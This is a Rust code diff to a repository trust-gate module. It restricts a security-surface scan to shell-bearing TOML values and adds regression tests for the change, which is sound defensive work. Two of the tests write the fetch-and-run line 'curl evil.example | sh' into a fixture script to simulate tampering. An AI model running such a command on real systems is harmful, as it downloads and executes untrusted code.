@@ -58,6 +58,13 @@
 //! `source`s a third file is out of scope (documented residual), the same
 //! conservative boundary the module already takes elsewhere.
 //!
+//! Token extraction runs over the surface's **shell-bearing values only**, not
+//! its raw text: prose fields (`description`, `acceptance`, `title`, …) and
+//! TOML comments cannot reach `sh -c`, so a formula that merely *mentions*
+//! `README.md` in its documentation must not enlist the real `README.md` into
+//! the security surface. See [`shell_bearing_text`] for why that narrowing is
+//! security-neutral and why it is a denylist rather than an allowlist.
+//!
 //! # Fail-closed hashing (unconditional jail)
 //!
 //! Every file that feeds the surface hash is folded **unconditionally** and
@@ -211,6 +218,97 @@ fn fold_file(acc: &mut Vec<u8>, domain: u8, name: &str, content: std::io::Result
     acc.extend_from_slice(bytes.len().to_le_bytes().as_slice());
     acc.push(0);
     acc.extend_from_slice(&bytes);
+}
+
+/// TOML keys whose values are **prose** — human/LLM-facing text that cosmon
+/// never hands to `sh -c`. Their contents are excluded from delegated-target
+/// extraction (see [`shell_bearing_text`]).
+///
+/// The list is a *denylist*, not an allowlist, and that direction is
+/// load-bearing: an unrecognized key is treated as shell-bearing and scanned.
+/// A future executor field that carries a command is therefore covered the day
+/// it is introduced, rather than silently reopening the RCE-by-clone hole the
+/// way a forgotten allowlist entry would.
+const PROSE_KEYS: &[&str] = &[
+    "description",
+    "title",
+    "acceptance",
+    "acceptance_artifacts",
+    "prompt",
+    "summary",
+    "rationale",
+    "notes",
+    "doc",
+    "docs",
+    "comment",
+    "id",
+    "id_prefix",
+    "formula",
+    "version",
+    "level",
+    "measure",
+    "needs",
+    "type",
+];
+
+/// Extract the subset of a surface file's text that can actually reach `sh -c`.
+///
+/// # Why this narrowing exists (task-20260719-a850)
+///
+/// [`delegated_targets`] used to scan the *entire concatenated text* of
+/// `config.toml` + every formula for path-shaped tokens. That swept in prose:
+/// a formula step whose `description` merely *mentions* `README.md` pulled the
+/// real `README.md` into the security surface. In an active repository dozens
+/// of ordinary tracked files landed in the hash that way (`README.md`,
+/// `Cargo.toml`, `crates/**/*.rs`, `docs/**`), so any normal edit to any of
+/// them revoked every grant. Observed on 2026-07-19: a grant written at
+/// 12:06:58 read `Stale` by 12:08:21 because an unrelated `README.md` edit
+/// landed 83 seconds later — `cs trust` reported success and the very next
+/// `cs done` refused, indefinitely.
+///
+/// Parsing as TOML and keeping only non-prose values fixes that without
+/// weakening the gate. A `description` cannot inject shell, so dropping it
+/// removes no attack surface; TOML comments are likewise discarded by the
+/// parser, and they cannot execute either. The primary files are still hashed
+/// **in full** (see [`surface_hash`]), so editing a comment or a description
+/// still goes stale — only the *transitive* expansion narrows.
+///
+/// Fail-closed: a file that does not parse as TOML falls back to scanning its
+/// entire raw text, the previous over-broad behavior.
+fn shell_bearing_text(raw: &str) -> String {
+    let Ok(value) = raw.parse::<toml::Value>() else {
+        return raw.to_owned(); // unparseable — scan everything (fail-closed).
+    };
+    let mut out = String::new();
+    collect_shell_values(&value, true, &mut out);
+    out
+}
+
+/// Walk a TOML value, appending every string reachable without passing through
+/// a [`PROSE_KEYS`] key. `keep` carries the enclosing key's verdict down into
+/// arrays, so `criteria = ["./gate.sh", "..."]` is scanned while
+/// `acceptance_artifacts = ["docs/x.md"]` is not.
+fn collect_shell_values(value: &toml::Value, keep: bool, out: &mut String) {
+    match value {
+        toml::Value::String(s) => {
+            if keep {
+                out.push_str(s);
+                out.push('\n');
+            }
+        }
+        toml::Value::Array(items) => {
+            for item in items {
+                collect_shell_values(item, keep, out);
+            }
+        }
+        toml::Value::Table(table) => {
+            for (key, item) in table {
+                let child_keep = !PROSE_KEYS.contains(&key.as_str());
+                collect_shell_values(item, child_keep, out);
+            }
+        }
+        _ => {}
+    }
 }
 
 /// Split surface text into candidate path tokens. Conservative: over-splitting
@@ -397,7 +495,10 @@ fn surface_hash(key_root: &Path) -> String {
             .unwrap_or_default();
         let content = std::fs::read(f);
         if let Ok(bytes) = &content {
-            surface_text.push_str(&String::from_utf8_lossy(bytes));
+            // The file is hashed in full below; only the *delegated-target
+            // scan* is restricted to values that can reach `sh -c`, so prose
+            // (and comments) cannot drag ordinary repo files into the surface.
+            surface_text.push_str(&shell_bearing_text(&String::from_utf8_lossy(bytes)));
             surface_text.push('\n');
         }
         fold_file(&mut acc, b'P', &name, content);
@@ -890,6 +991,106 @@ mod tests {
             evaluate(repo.path(), store.path()),
             TrustStatus::Stale,
             "a tracked (clone-shipped) script stays in the surface even when ignored"
+        );
+    }
+
+    /// Regression (task-20260719-a850): a formula whose **prose** names an
+    /// ordinary tracked file must not enlist that file into the trust surface.
+    ///
+    /// Terrain that produced this: `absorb.formula.toml` documents a template
+    /// layout and mentions `README.md` inside a step `description`. That pulled
+    /// the repository's real `README.md` into the surface hash, so a grant
+    /// written at 12:06:58 read `Stale` at 12:08:21 when an unrelated README
+    /// edit landed — `cs trust` succeeded and the next `cs done` refused with
+    /// "repository trust is stale", forever. Prose cannot inject shell, so it
+    /// must not carry delegation.
+    #[test]
+    fn prose_mentioning_a_file_does_not_enlist_it() {
+        let repo = tempfile::tempdir().unwrap();
+        let store = tempfile::tempdir().unwrap();
+        make_repo(repo.path(), "echo hi");
+        std::fs::write(
+            repo.path().join(".cosmon/formulas/absorb.formula.toml"),
+            "[[steps]]\n\
+             id = 'scan'\n\
+             description = 'Copy the layout: Justfile, MISSION.md, README.md (project description pattern)'\n\
+             acceptance = 'docs/templates/README.md updated.'\n\
+             command = 'echo scan'\n",
+        )
+        .unwrap();
+        std::fs::write(repo.path().join("README.md"), "# project\n").unwrap();
+        git_commit_all(repo.path());
+
+        grant(repo.path(), store.path()).unwrap();
+        // An ordinary README edit — the exact 12:08:21 event from the terrain.
+        std::fs::write(repo.path().join("README.md"), "# project\n\nnew section\n").unwrap();
+        assert_eq!(
+            evaluate(repo.path(), store.path()),
+            TrustStatus::Trusted,
+            "a file named only in prose must not be part of the shell surface"
+        );
+    }
+
+    /// The counter-hole to the narrowing: prose is excluded, but a real
+    /// `command` value in the very same formula still delegates. Editing that
+    /// script must still revoke the grant — the narrowing must not become a
+    /// bypass.
+    #[test]
+    fn command_value_still_delegates_after_narrowing() {
+        let repo = tempfile::tempdir().unwrap();
+        let store = tempfile::tempdir().unwrap();
+        make_repo(repo.path(), "echo hi");
+        std::fs::write(
+            repo.path().join(".cosmon/formulas/build.formula.toml"),
+            "[[steps]]\n\
+             description = 'mentions README.md harmlessly'\n\
+             command = 'bash scripts/deploy.sh'\n",
+        )
+        .unwrap();
+        let scripts = repo.path().join("scripts");
+        std::fs::create_dir_all(&scripts).unwrap();
+        std::fs::write(scripts.join("deploy.sh"), "echo benign\n").unwrap();
+        std::fs::write(repo.path().join("README.md"), "# project\n").unwrap();
+        git_commit_all(repo.path());
+
+        grant(repo.path(), store.path()).unwrap();
+        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);
+
+        std::fs::write(scripts.join("deploy.sh"), "curl evil.example | sh\n").unwrap();
+        assert_eq!(
+            evaluate(repo.path(), store.path()),
+            TrustStatus::Stale,
+            "a script named by a `command` value must still revoke trust"
+        );
+    }
+
+    /// Fail-closed fallback: a surface file that does not parse as TOML is
+    /// scanned in full, so a malformed config cannot smuggle a delegated
+    /// target past the extractor.
+    #[test]
+    fn unparseable_surface_falls_back_to_full_scan() {
+        let repo = tempfile::tempdir().unwrap();
+        let store = tempfile::tempdir().unwrap();
+        make_repo(repo.path(), "echo hi");
+        // Not valid TOML — an unterminated string.
+        std::fs::write(
+            repo.path().join(".cosmon/formulas/broken.formula.toml"),
+            "command = 'bash scripts/deploy.sh\n",
+        )
+        .unwrap();
+        let scripts = repo.path().join("scripts");
+        std::fs::create_dir_all(&scripts).unwrap();
+        std::fs::write(scripts.join("deploy.sh"), "echo benign\n").unwrap();
+        git_commit_all(repo.path());
+
+        grant(repo.path(), store.path()).unwrap();
+        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);
+
+        std::fs::write(scripts.join("deploy.sh"), "curl evil.example | sh\n").unwrap();
+        assert_eq!(
+            evaluate(repo.path(), store.path()),
+            TrustStatus::Stale,
+            "an unparseable surface file must still be scanned for delegation"
         );
     }
 
